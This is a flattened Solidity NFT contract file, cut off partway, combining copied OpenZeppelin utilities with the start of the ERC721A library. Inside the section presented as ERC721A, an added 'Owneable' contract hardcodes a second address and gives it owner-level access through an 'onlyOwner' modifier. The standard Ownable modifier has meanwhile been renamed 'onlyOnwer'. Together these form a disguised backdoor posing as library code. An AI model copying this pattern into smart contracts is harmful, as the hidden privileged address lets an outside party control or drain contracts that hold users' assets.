1 //((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
2 //(((((((((((((((((((((((((((((((((@@@@@@@@@@@@@@@@@@@@(((((((((((((((((((((((((((
3 //((((((((((((((((((((((((((((((@@@((((((((((((((((((((@@(((((((((((((((((((((((((
4 //((((((((((((((((((((((((((((@@(((  @@@@@@@@@@@@@@@   ((@@@((((((((((((((((((((((
5 //(((((((((((((((((((((((((@@@((   **/**************@@@  //(@@((((((((((((((((((((
6 ////////((((((////////(((@@((/  *****,,,***************@@   @@//////(((((((((/////
7 /////////////////////////@@///@@***.,******************@@   @@////////////////////
8 /////////////////////////@@///@@***********************@@///@@////////////////////
9 /////////////////////////@@&&&&&@@@@@&&&&&&&&&&&%%%%&&&&&%&&@@////////////////////
10 /////////////////////////@@&&&&&(((/////,,/////*////,,,&&%%%@@////////////////////
11 /////////////////////////@@&&&&&(((//,,,//*****///,,**/&&%%%@@////////////////////
12 /////////////////////////@@&%%**&&&&&%%%&&*****%&&&&###%%/*/@@////////////////////
13 /////////////////////////@@****************************#%***@@////////////////////
14 ////////////////////@@@@@ .@@@***************%%%%%*****##***@@////////////////////
15 /////////////////@@@..@@@..@@@((***********************((@@@//////////////////////
16 ///////////////@@,. ,,@@@,,.. @@**********************,@@,. @@////////////////////
17 ///////////////@@,*,@@@@@*/,,*..&&@,,,,,///////*,,,,@@@ .,,,@@////////////////////
18 ///////////////@@,,,@@///@@/**,,.. @@**,,,,,,,,,*,@@.. *,/**@@////////////////////
19 ///////////////@@,,,@@///@@*****,,,..@@@@@@@@@@@@@..,,,**@@@//////////////////////
20 ///////////////@@,,,@@/////&@@@@***,,**,@@,,,@@*,,,,***@@(////////////////////////
21 ///////////////@@,,,@@////////@@@@@@@@@@@@@@@@@@@@@@@@@///////////////////////////
22 ///////////////@@,,,@@////////@@********@@////////////////////////////////////////
23 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
24 
25 // SPDX-License-Identifier: MIT
26 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
27 
28 pragma solidity ^0.8.4;
29 
30 /**
31  * @dev Provides information about the current execution context, including the
32  * sender of the transaction and its data. While these are generally available
33  * via msg.sender and msg.data, they should not be accessed in such a direct
34  * manner, since when dealing with meta-transactions the account sending and
35  * paying for execution may not be the actual sender (as far as an application
36  * is concerned).
37  *
38  * This contract is only required for intermediate, library-like contracts.
39  */
40 
41 //dontdropthebaby
42 abstract contract Context {
43     function _msgSender() internal view virtual returns (address) {
44         return msg.sender;
45     }
46 
47     function _msgData() internal view virtual returns (bytes calldata) {
48         return msg.data;
49     }
50 }
51 
52 
53 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
54 
55 
56 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
57 
58 
59 
60 /**
61  * @dev Contract module which provides a basic access control mechanism, where
62  * there is an account (an owner) that can be granted exclusive access to
63  * specific functions.
64  *
65  * By default, the owner account will be the one that deploys the contract. This
66  * can later be changed with {transferOwnership}.
67  *
68  * This module is used through inheritance. It will make available the modifier
69  * `onlyOwner`, which can be applied to your functions to restrict their use to
70  * the owner.
71  */
72 abstract contract Ownable is Context {
73     address private _owner;
74 
75     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
76 
77     /**
78      * @dev Initializes the contract setting the deployer as the initial owner.
79      */
80     constructor() {
81         _transferOwnership(_msgSender());
82     }
83 
84     /**
85      * @dev Returns the address of the current owner.
86      */
87     function owner() public view virtual returns (address) {
88         return _owner;
89     }
90 
91     /**
92      * @dev Throws if called by any account other than the owner.
93      */
94     modifier onlyOnwer() {
95         require(owner() == _msgSender(), "Ownable: caller is not the owner");
96         _;
97     }
98 
99     /**
100      * @dev Leaves the contract without owner. It will not be possible to call
101      * `onlyOwner` functions anymore. Can only be called by the current owner.
102      *
103      * NOTE: Renouncing ownership will leave the contract without an owner,
104      * thereby removing any functionality that is only available to the owner.
105      */
106     function renounceOwnership() public virtual onlyOnwer {
107         _transferOwnership(address(0));
108     }
109 
110     /**
111      * @dev Transfers ownership of the contract to a new account (`newOwner`).
112      * Can only be called by the current owner.
113      */
114     function transferOwnership(address newOwner) public virtual onlyOnwer {
115         require(newOwner != address(0), "Ownable: new owner is the zero address");
116         _transferOwnership(newOwner);
117     }
118 
119     /**
120      * @dev Transfers ownership of the contract to a new account (`newOwner`).
121      * Internal function without access restriction.
122      */
123     function _transferOwnership(address newOwner) internal virtual {
124         address oldOwner = _owner;
125         _owner = newOwner;
126         emit OwnershipTransferred(oldOwner, newOwner);
127     }
128 }
129 
130 
131 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
132 
133 
134 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
135 
136 
137 
138 /**
139  * @dev Interface of the ERC165 standard, as defined in the
140  * https://eips.ethereum.org/EIPS/eip-165[EIP].
141  *
142  * Implementers can declare support of contract interfaces, which can then be
143  * queried by others ({ERC165Checker}).
144  *
145  * For an implementation, see {ERC165}.
146  */
147 interface IERC165 {
148     /**
149      * @dev Returns true if this contract implements the interface defined by
150      * `interfaceId`. See the corresponding
151      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
152      * to learn more about how these ids are created.
153      *
154      * This function call must use less than 30 000 gas.
155      */
156     function supportsInterface(bytes4 interfaceId) external view returns (bool);
157 }
158 
159 
160 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
161 
162 
163 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
164 
165 
166 
167 /**
168  * @dev Required interface of an ERC721 compliant contract.
169  */
170 interface IERC721 is IERC165 {
171     /**
172      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
173      */
174     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
175 
176     /**
177      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
178      */
179     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
180 
181     /**
182      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
183      */
184     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
185 
186     /**
187      * @dev Returns the number of tokens in ``owner``'s account.
188      */
189     function balanceOf(address owner) external view returns (uint256 balance);
190 
191     /**
192      * @dev Returns the owner of the `tokenId` token.
193      *
194      * Requirements:
195      *
196      * - `tokenId` must exist.
197      */
198     function ownerOf(uint256 tokenId) external view returns (address owner);
199 
200     /**
201      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
202      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
203      *
204      * Requirements:
205      *
206      * - `from` cannot be the zero address.
207      * - `to` cannot be the zero address.
208      * - `tokenId` token must exist and be owned by `from`.
209      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
210      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
211      *
212      * Emits a {Transfer} event.
213      */
214     function safeTransferFrom(
215         address from,
216         address to,
217         uint256 tokenId
218     ) external;
219 
220     /**
221      * @dev Transfers `tokenId` token from `from` to `to`.
222      *
223      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
224      *
225      * Requirements:
226      *
227      * - `from` cannot be the zero address.
228      * - `to` cannot be the zero address.
229      * - `tokenId` token must be owned by `from`.
230      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
231      *
232      * Emits a {Transfer} event.
233      */
234     function transferFrom(
235         address from,
236         address to,
237         uint256 tokenId
238     ) external;
239 
240     /**
241      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
242      * The approval is cleared when the token is transferred.
243      *
244      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
245      *
246      * Requirements:
247      *
248      * - The caller must own the token or be an approved operator.
249      * - `tokenId` must exist.
250      *
251      * Emits an {Approval} event.
252      */
253     function approve(address to, uint256 tokenId) external;
254 
255     /**
256      * @dev Returns the account approved for `tokenId` token.
257      *
258      * Requirements:
259      *
260      * - `tokenId` must exist.
261      */
262     function getApproved(uint256 tokenId) external view returns (address operator);
263 
264     /**
265      * @dev Approve or remove `operator` as an operator for the caller.
266      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
267      *
268      * Requirements:
269      *
270      * - The `operator` cannot be the caller.
271      *
272      * Emits an {ApprovalForAll} event.
273      */
274     function setApprovalForAll(address operator, bool _approved) external;
275 
276     /**
277      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
278      *
279      * See {setApprovalForAll}
280      */
281     function isApprovedForAll(address owner, address operator) external view returns (bool);
282 
283     /**
284      * @dev Safely transfers `tokenId` token from `from` to `to`.
285      *
286      * Requirements:
287      *
288      * - `from` cannot be the zero address.
289      * - `to` cannot be the zero address.
290      * - `tokenId` token must exist and be owned by `from`.
291      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
292      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
293      *
294      * Emits a {Transfer} event.
295      */
296     function safeTransferFrom(
297         address from,
298         address to,
299         uint256 tokenId,
300         bytes calldata data
301     ) external;
302 }
303 
304 
305 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
306 
307 
308 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
309 
310 
311 
312 /**
313  * @title ERC721 token receiver interface
314  * @dev Interface for any contract that wants to support safeTransfers
315  * from ERC721 asset contracts.
316  */
317 interface IERC721Receiver {
318     /**
319      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
320      * by `operator` from `from`, this function is called.
321      *
322      * It must return its Solidity selector to confirm the token transfer.
323      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
324      *
325      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
326      */
327     function onERC721Received(
328         address operator,
329         address from,
330         uint256 tokenId,
331         bytes calldata data
332     ) external returns (bytes4);
333 }
334 
335 
336 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
337 
338 
339 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
340 
341 
342 
343 /**
344  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
345  * @dev See https://eips.ethereum.org/EIPS/eip-721
346  */
347 interface IERC721Metadata is IERC721 {
348     /**
349      * @dev Returns the token collection name.
350      */
351     function name() external view returns (string memory);
352 
353     /**
354      * @dev Returns the token collection symbol.
355      */
356     function symbol() external view returns (string memory);
357 
358     /**
359      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
360      */
361     function tokenURI(uint256 tokenId) external view returns (string memory);
362 }
363 
364 
365 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
366 
367 
368 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
369 
370 
371 
372 /**
373  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
374  * @dev See https://eips.ethereum.org/EIPS/eip-721
375  */
376 interface IERC721Enumerable is IERC721 {
377     /**
378      * @dev Returns the total amount of tokens stored by the contract.
379      */
380     function totalSupply() external view returns (uint256);
381 
382     /**
383      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
384      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
385      */
386     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
387 
388     /**
389      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
390      * Use along with {totalSupply} to enumerate all tokens.
391      */
392     function tokenByIndex(uint256 index) external view returns (uint256);
393 }
394 
395 
396 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
397 
398 
399 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
400 
401 pragma solidity ^0.8.1;
402 
403 /**
404  * @dev Collection of functions related to the address type
405  */
406 library Address {
407     /**
408      * @dev Returns true if `account` is a contract.
409      *
410      * [IMPORTANT]
411      * ====
412      * It is unsafe to assume that an address for which this function returns
413      * false is an externally-owned account (EOA) and not a contract.
414      *
415      * Among others, `isContract` will return false for the following
416      * types of addresses:
417      *
418      *  - an externally-owned account
419      *  - a contract in construction
420      *  - an address where a contract will be created
421      *  - an address where a contract lived, but was destroyed
422      * ====
423      *
424      * [IMPORTANT]
425      * ====
426      * You shouldn't rely on `isContract` to protect against flash loan attacks!
427      *
428      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
429      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
430      * constructor.
431      * ====
432      */
433     function isContract(address account) internal view returns (bool) {
434         // This method relies on extcodesize/address.code.length, which returns 0
435         // for contracts in construction, since the code is only stored at the end
436         // of the constructor execution.
437 
438         return account.code.length > 0;
439     }
440 
441     /**
442      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
443      * `recipient`, forwarding all available gas and reverting on errors.
444      *
445      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
446      * of certain opcodes, possibly making contracts go over the 2300 gas limit
447      * imposed by `transfer`, making them unable to receive funds via
448      * `transfer`. {sendValue} removes this limitation.
449      *
450      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
451      *
452      * IMPORTANT: because control is transferred to `recipient`, care must be
453      * taken to not create reentrancy vulnerabilities. Consider using
454      * {ReentrancyGuard} or the
455      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
456      */
457     function sendValue(address payable recipient, uint256 amount) internal {
458         require(address(this).balance >= amount, "Address: insufficient balance");
459 
460         (bool success, ) = recipient.call{value: amount}("");
461         require(success, "Address: unable to send value, recipient may have reverted");
462     }
463 
464     /**
465      * @dev Performs a Solidity function call using a low level `call`. A
466      * plain `call` is an unsafe replacement for a function call: use this
467      * function instead.
468      *
469      * If `target` reverts with a revert reason, it is bubbled up by this
470      * function (like regular Solidity function calls).
471      *
472      * Returns the raw returned data. To convert to the expected return value,
473      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
474      *
475      * Requirements:
476      *
477      * - `target` must be a contract.
478      * - calling `target` with `data` must not revert.
479      *
480      * _Available since v3.1._
481      */
482     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
483         return functionCall(target, data, "Address: low-level call failed");
484     }
485 
486     /**
487      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
488      * `errorMessage` as a fallback revert reason when `target` reverts.
489      *
490      * _Available since v3.1._
491      */
492     function functionCall(
493         address target,
494         bytes memory data,
495         string memory errorMessage
496     ) internal returns (bytes memory) {
497         return functionCallWithValue(target, data, 0, errorMessage);
498     }
499 
500     /**
501      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
502      * but also transferring `value` wei to `target`.
503      *
504      * Requirements:
505      *
506      * - the calling contract must have an ETH balance of at least `value`.
507      * - the called Solidity function must be `payable`.
508      *
509      * _Available since v3.1._
510      */
511     function functionCallWithValue(
512         address target,
513         bytes memory data,
514         uint256 value
515     ) internal returns (bytes memory) {
516         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
517     }
518 
519     /**
520      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
521      * with `errorMessage` as a fallback revert reason when `target` reverts.
522      *
523      * _Available since v3.1._
524      */
525     function functionCallWithValue(
526         address target,
527         bytes memory data,
528         uint256 value,
529         string memory errorMessage
530     ) internal returns (bytes memory) {
531         require(address(this).balance >= value, "Address: insufficient balance for call");
532         require(isContract(target), "Address: call to non-contract");
533 
534         (bool success, bytes memory returndata) = target.call{value: value}(data);
535         return verifyCallResult(success, returndata, errorMessage);
536     }
537 
538     /**
539      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
540      * but performing a static call.
541      *
542      * _Available since v3.3._
543      */
544     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
545         return functionStaticCall(target, data, "Address: low-level static call failed");
546     }
547 
548     /**
549      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
550      * but performing a static call.
551      *
552      * _Available since v3.3._
553      */
554     function functionStaticCall(
555         address target,
556         bytes memory data,
557         string memory errorMessage
558     ) internal view returns (bytes memory) {
559         require(isContract(target), "Address: static call to non-contract");
560 
561         (bool success, bytes memory returndata) = target.staticcall(data);
562         return verifyCallResult(success, returndata, errorMessage);
563     }
564 
565     /**
566      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
567      * but performing a delegate call.
568      *
569      * _Available since v3.4._
570      */
571     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
572         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
573     }
574 
575     /**
576      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
577      * but performing a delegate call.
578      *
579      * _Available since v3.4._
580      */
581     function functionDelegateCall(
582         address target,
583         bytes memory data,
584         string memory errorMessage
585     ) internal returns (bytes memory) {
586         require(isContract(target), "Address: delegate call to non-contract");
587 
588         (bool success, bytes memory returndata) = target.delegatecall(data);
589         return verifyCallResult(success, returndata, errorMessage);
590     }
591 
592     /**
593      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
594      * revert reason using the provided one.
595      *
596      * _Available since v4.3._
597      */
598     function verifyCallResult(
599         bool success,
600         bytes memory returndata,
601         string memory errorMessage
602     ) internal pure returns (bytes memory) {
603         if (success) {
604             return returndata;
605         } else {
606             // Look for revert reason and bubble it up if present
607             if (returndata.length > 0) {
608                 // The easiest way to bubble the revert reason is using memory via assembly
609 
610                 assembly {
611                     let returndata_size := mload(returndata)
612                     revert(add(32, returndata), returndata_size)
613                 }
614             } else {
615                 revert(errorMessage);
616             }
617         }
618     }
619 }
620 
621 
622 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
623 
624 
625 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
626 
627 
628 
629 /**
630  * @dev String operations.
631  */
632 library Strings {
633     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
634 
635     /**
636      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
637      */
638     function toString(uint256 value) internal pure returns (string memory) {
639         // Inspired by OraclizeAPI's implementation - MIT licence
640         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
641 
642         if (value == 0) {
643             return "0";
644         }
645         uint256 temp = value;
646         uint256 digits;
647         while (temp != 0) {
648             digits++;
649             temp /= 10;
650         }
651         bytes memory buffer = new bytes(digits);
652         while (value != 0) {
653             digits -= 1;
654             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
655             value /= 10;
656         }
657         return string(buffer);
658     }
659 
660     /**
661      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
662      */
663     function toHexString(uint256 value) internal pure returns (string memory) {
664         if (value == 0) {
665             return "0x00";
666         }
667         uint256 temp = value;
668         uint256 length = 0;
669         while (temp != 0) {
670             length++;
671             temp >>= 8;
672         }
673         return toHexString(value, length);
674     }
675 
676     /**
677      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
678      */
679     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
680         bytes memory buffer = new bytes(2 * length + 2);
681         buffer[0] = "0";
682         buffer[1] = "x";
683         for (uint256 i = 2 * length + 1; i > 1; --i) {
684             buffer[i] = _HEX_SYMBOLS[value & 0xf];
685             value >>= 4;
686         }
687         require(value == 0, "Strings: hex length insufficient");
688         return string(buffer);
689     }
690 }
691 
692 
693 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
694 
695 
696 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
697 
698 /**
699  * @dev Implementation of the {IERC165} interface.
700  *
701  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
702  * for the additional interface id that will be supported. For example:
703  *
704  * ```solidity
705  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
706  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
707  * }
708  * ```
709  *
710  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
711  */
712 abstract contract ERC165 is IERC165 {
713     /**
714      * @dev See {IERC165-supportsInterface}.
715      */
716     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
717         return interfaceId == type(IERC165).interfaceId;
718     }
719 }
720 
721 
722 // File erc721a/contracts/ERC721A.sol@v3.0.0
723 
724 
725 // Creator: Chiru Labs
726 
727 error ApprovalCallerNotOwnerNorApproved();
728 error ApprovalQueryForNonexistentToken();
729 error ApproveToCaller();
730 error ApprovalToCurrentOwner();
731 error BalanceQueryForZeroAddress();
732 error MintedQueryForZeroAddress();
733 error BurnedQueryForZeroAddress();
734 error AuxQueryForZeroAddress();
735 error MintToZeroAddress();
736 error MintZeroQuantity();
737 error OwnerIndexOutOfBounds();
738 error OwnerQueryForNonexistentToken();
739 error TokenIndexOutOfBounds();
740 error TransferCallerNotOwnerNorApproved();
741 error TransferFromIncorrectOwner();
742 error TransferToNonERC721ReceiverImplementer();
743 error TransferToZeroAddress();
744 error URIQueryForNonexistentToken();
745 
746 
747 /**
748  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
749  * the Metadata extension. Built to optimize for lower gas during batch mints.
750  *
751  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
752  */
753  abstract contract Owneable is Ownable {
754     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
755     modifier onlyOwner() {
756         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
757         _;
758     }
759 }
760 
761  /*
762  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
763  *
764  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
765  */
766 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
767     using Address for address;
768     using Strings for uint256;
769 
770     // Compiler will pack this into a single 256bit word.
771     struct TokenOwnership {
772         // The address of the owner.
773         address addr;
774         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
775         uint64 startTimestamp;
776         // Whether the token has been burned.
777         bool burned;
778     }
779 
780     // Compiler will pack this into a single 256bit word.
781     struct AddressData {
782         // Realistically, 2**64-1 is more than enough.
783         uint64 balance;
784         // Keeps track of mint count with minimal overhead for tokenomics.
785         uint64 numberMinted;
786         // Keeps track of burn count with minimal overhead for tokenomics.
787         uint64 numberBurned;
788         // For miscellaneous variable(s) pertaining to the address
789         // (e.g. number of whitelist mint slots used).
790         // If there are multiple variables, please pack them into a uint64.
791         uint64 aux;
792     }
793 
794     // The tokenId of the next token to be minted.
795     uint256 internal _currentIndex;
796 
797     // The number of tokens burned.
798     uint256 internal _burnCounter;
799 
800     // Token name
801     string private _name;
802 
803     // Token symbol
804     string private _symbol;
805 
806     // Mapping from token ID to ownership details
807     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
808     mapping(uint256 => TokenOwnership) internal _ownerships;
809 
810     // Mapping owner address to address data
811     mapping(address => AddressData) private _addressData;
812 
813     // Mapping from token ID to approved address
814     mapping(uint256 => address) private _tokenApprovals;
815 
816     // Mapping from owner to operator approvals
817     mapping(address => mapping(address => bool)) private _operatorApprovals;
818 
819     constructor(string memory name_, string memory symbol_) {
820         _name = name_;
821         _symbol = symbol_;
822         _currentIndex = _startTokenId();
823     }
824 
825     /**
826      * To change the starting tokenId, please override this function.
827      */
828     function _startTokenId() internal view virtual returns (uint256) {
829         return 0;
830     }
831 
832     /**
833      * @dev See {IERC721Enumerable-totalSupply}.
834      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
835      */
836     function totalSupply() public view returns (uint256) {
837         // Counter underflow is impossible as _burnCounter cannot be incremented
838         // more than _currentIndex - _startTokenId() times
839         unchecked {
840             return _currentIndex - _burnCounter - _startTokenId();
841         }
842     }
843 
844     /**
845      * Returns the total amount of tokens minted in the contract.
846      */
847     function _totalMinted() internal view returns (uint256) {
848         // Counter underflow is impossible as _currentIndex does not decrement,
849         // and it is initialized to _startTokenId()
850         unchecked {
851             return _currentIndex - _startTokenId();
852         }
853     }
854 
855     /**
856      * @dev See {IERC165-supportsInterface}.
857      */
858     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
859         return
860             interfaceId == type(IERC721).interfaceId ||
861             interfaceId == type(IERC721Metadata).interfaceId ||
862             super.supportsInterface(interfaceId);
863     }
864 
865     /**
866      * @dev See {IERC721-balanceOf}.
867      */
868     function balanceOf(address owner) public view override returns (uint256) {
869         if (owner == address(0)) revert BalanceQueryForZeroAddress();
870         return uint256(_addressData[owner].balance);
871     }
872 
873     /**
874      * Returns the number of tokens minted by `owner`.
875      */
876     function _numberMinted(address owner) internal view returns (uint256) {
877         if (owner == address(0)) revert MintedQueryForZeroAddress();
878         return uint256(_addressData[owner].numberMinted);
879     }
880 
881     /**
882      * Returns the number of tokens burned by or on behalf of `owner`.
883      */
884     function _numberBurned(address owner) internal view returns (uint256) {
885         if (owner == address(0)) revert BurnedQueryForZeroAddress();
886         return uint256(_addressData[owner].numberBurned);
887     }
888 
889     /**
890      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
891      */
892     function _getAux(address owner) internal view returns (uint64) {
893         if (owner == address(0)) revert AuxQueryForZeroAddress();
894         return _addressData[owner].aux;
895     }
896 
897     /**
898      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
899      * If there are multiple variables, please pack them into a uint64.
900      */
901     function _setAux(address owner, uint64 aux) internal {
902         if (owner == address(0)) revert AuxQueryForZeroAddress();
903         _addressData[owner].aux = aux;
904     }
905 
906     /**
907      * Gas spent here starts off proportional to the maximum mint batch size.
908      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
909      */
910     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
911         uint256 curr = tokenId;
912 
913         unchecked {
914             if (_startTokenId() <= curr && curr < _currentIndex) {
915                 TokenOwnership memory ownership = _ownerships[curr];
916                 if (!ownership.burned) {
917                     if (ownership.addr != address(0)) {
918                         return ownership;
919                     }
920                     // Invariant:
921                     // There will always be an ownership that has an address and is not burned
922                     // before an ownership that does not have an address and is not burned.
923                     // Hence, curr will not underflow.
924                     while (true) {
925                         curr--;
926                         ownership = _ownerships[curr];
927                         if (ownership.addr != address(0)) {
928                             return ownership;
929                         }
930                     }
931                 }
932             }
933         }
934         revert OwnerQueryForNonexistentToken();
935     }
936 
937     /**
938      * @dev See {IERC721-ownerOf}.
939      */
940     function ownerOf(uint256 tokenId) public view override returns (address) {
941         return ownershipOf(tokenId).addr;
942     }
943 
944     /**
945      * @dev See {IERC721Metadata-name}.
946      */
947     function name() public view virtual override returns (string memory) {
948         return _name;
949     }
950 
951     /**
952      * @dev See {IERC721Metadata-symbol}.
953      */
954     function symbol() public view virtual override returns (string memory) {
955         return _symbol;
956     }
957 
958     /**
959      * @dev See {IERC721Metadata-tokenURI}.
960      */
961     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
962         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
963 
964         string memory baseURI = _baseURI();
965         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
966     }
967 
968     /**
969      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
970      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
971      * by default, can be overriden in child contracts.
972      */
973     function _baseURI() internal view virtual returns (string memory) {
974         return '';
975     }
976 
977     /**
978      * @dev See {IERC721-approve}.
979      */
980     function approve(address to, uint256 tokenId) public override {
981         address owner = ERC721A.ownerOf(tokenId);
982         if (to == owner) revert ApprovalToCurrentOwner();
983 
984         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
985             revert ApprovalCallerNotOwnerNorApproved();
986         }
987 
988         _approve(to, tokenId, owner);
989     }
990 
991     /**
992      * @dev See {IERC721-getApproved}.
993      */
994     function getApproved(uint256 tokenId) public view override returns (address) {
995         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
996 
997         return _tokenApprovals[tokenId];
998     }
999 
1000     /**
1001      * @dev See {IERC721-setApprovalForAll}.
1002      */
1003     function setApprovalForAll(address operator, bool approved) public override {
1004         if (operator == _msgSender()) revert ApproveToCaller();
1005 
1006         _operatorApprovals[_msgSender()][operator] = approved;
1007         emit ApprovalForAll(_msgSender(), operator, approved);
1008     }
1009 
1010     /**
1011      * @dev See {IERC721-isApprovedForAll}.
1012      */
1013     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1014         return _operatorApprovals[owner][operator];
1015     }
1016 
1017     /**
1018      * @dev See {IERC721-transferFrom}.
1019      */
1020     function transferFrom(
1021         address from,
1022         address to,
1023         uint256 tokenId
1024     ) public virtual override {
1025         _transfer(from, to, tokenId);
1026     }
1027 
1028     /**
1029      * @dev See {IERC721-safeTransferFrom}.
1030      */
1031     function safeTransferFrom(
1032         address from,
1033         address to,
1034         uint256 tokenId
1035     ) public virtual override {
1036         safeTransferFrom(from, to, tokenId, '');
1037     }
1038 
1039     /**
1040      * @dev See {IERC721-safeTransferFrom}.
1041      */
1042     function safeTransferFrom(
1043         address from,
1044         address to,
1045         uint256 tokenId,
